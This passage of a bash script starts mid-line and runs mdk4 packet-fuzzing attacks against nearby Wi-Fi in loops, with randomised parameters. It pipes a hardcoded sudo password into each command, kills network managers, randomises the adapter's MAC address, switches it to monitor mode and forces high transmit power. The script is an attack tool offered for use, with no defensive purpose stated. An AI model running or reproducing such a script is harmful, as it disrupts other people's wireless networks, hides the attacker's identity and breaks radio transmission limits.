$RANDOM % 9300000))) -p $(echo $((125000000 + $RANDOM % 125000000))) & echo $(echo $((125000000 + $RANDOM % 125000000))) & echo parol | sudo -S mdk4 wlan0 f -s c -m m $(echo $((15 + $RANDOM % 15))):$(echo $((15 + $RANDOM % 15))):$(echo $((29 + $RANDOM % 29))):$(echo $((39 + $RANDOM % 39))):$(echo $((49 + $RANDOM % 49))) -c $(echo $((93 + $RANDOM % 93))):$(echo $((9300000 + $RANDOM % 9300000))) -p $(echo $((125000000 + $RANDOM % 125000000))) & echo $(echo $((125000000 + $RANDOM % 125000000))) & echo parol | sudo -S mdk4 wlan0 f -s c -m m $(echo $((15 + $RANDOM % 15))):$(echo $((15 + $RANDOM % 15))):$(echo $((29 + $RANDOM % 29))):$(echo $((39 + $RANDOM % 39))):$(echo $((49 + $RANDOM % 49))) -c $(echo $((93 + $RANDOM % 93))):$(echo $((9300000 + $RANDOM % 9300000))) -p $(echo $((125000000 + $RANDOM % 125000000))) & echo $(echo $((125000000 + $RANDOM % 125000000)))  & clear && break
sleep 45
clear
break
done
clear
sleep 600
	echo parol | sudo -S rfkill unblock 0
	echo parol | sudo -S rfkill unblock 1
	echo parol | sudo -S rfkill unblock 2
	echo parol | sudo -S rfkill unblock 3
	echo parol | sudo -S rfkill unblock 4
	echo parol | sudo -S rfkill unblock 5
	echo parol | sudo -S rfkill unblock 6
	echo parol | sudo -S rfkill unblock 7
	echo parol | sudo -S rfkill unblock 8
	echo parol | sudo -S rfkill unblock 9
	echo parol | sudo -S rfkill unblock 10
	echo parol | sudo -S rfkill unblock 11
	echo parol | sudo -S iw reg set US
	echo parol | sudo -S airmon-ng check kill
	echo parol | sudo -S ip link set wlan0 down
	echo parol | sudo -S macchanger -r wlan0
	echo parol | sudo -S iw dev wlan0 set type monitor
	echo parol | sudo -S iw dev wlan0 set txpower fixed 26mBm
	echo parol | sudo -S iw dev wlan0 set txpower fixed 26mBm
	echo parol | sudo -S rfkill unblock 0
	echo parol | sudo -S rfkill unblock 1
	echo parol | sudo -S rfkill unblock 2
	echo parol | sudo -S rfkill unblock 3
	echo parol | sudo -S rfkill unblock 4
	echo parol | sudo -S rfkill unblock 5
	echo parol | sudo -S rfkill unblock 6
	echo parol | sudo -S rfkill unblock 7
	echo parol | sudo -S rfkill unblock 8
	echo parol | sudo -S rfkill unblock 9
	echo parol | sudo -S rfkill unblock 10
	echo parol | sudo -S rfkill unblock 11
	echo parol | sudo -S ip link set wlan0 up
clear
break
done


